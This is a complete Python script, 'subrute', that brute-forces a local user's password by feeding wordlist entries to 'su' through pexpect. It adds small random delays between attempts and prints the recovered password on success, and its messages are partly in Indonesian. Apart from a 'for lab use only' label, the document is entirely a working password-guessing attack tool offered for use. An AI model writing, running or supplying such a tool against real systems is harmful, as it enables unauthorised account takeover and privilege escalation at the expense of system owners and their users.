#!/usr/bin/env python3
import pexpect
import time
import random
import argparse
import sys
from datetime import datetime

def try_password(user, password, delay):
    child = pexpect.spawn(f"su {user} -c id", timeout=5)
    try:
        child.expect("Password:")
        child.sendline(password)
        index = child.expect([r"uid=\d+", "su: Authentication failure", pexpect.EOF, pexpect.TIMEOUT])
        if index == 0:
            return True, child.after.decode(errors="ignore").strip()
        return False, None
    except Exception as e:
        return False, str(e)
    finally:
        child.close()
        time.sleep(delay + random.uniform(0.1, 0.5))  # tambahin delay acak

def main():
    parser = argparse.ArgumentParser(description="subrute: su user bruteforcer (for lab use only)")
    parser.add_argument("-u", "--user", required=True, help="Target username")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay antar percobaan (default: 0.5s)")
    args = parser.parse_args()

    try:
        with open(args.wordlist, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist not found: {args.wordlist}")
        sys.exit(1)

    print(f"[*] Starting brute-force on user '{args.user}' with {len(passwords)} passwords")
    print(f"[*] Delay antar percobaan: {args.delay}s (dengan randomisasi kecil)\n")

    for i, pwd in enumerate(passwords, 1):
        print(f"[{i}/{len(passwords)}] Trying: {pwd}", end="\r")
        success, result = try_password(args.user, pwd, args.delay)
        if success:
            print(f"\n[✔] SUCCESS! Password untuk user '{args.user}' adalah: '{pwd}'")
            print(f"[>] Output: {result}")
            break
    else:
        print("\n[✘] Gagal menemukan password dari wordlist.")

if __name__ == "__main__":
    if sys.stdin.isatty():
        main()
    else:
        print("[-] This script must be run in an interactive terminal (TTY).")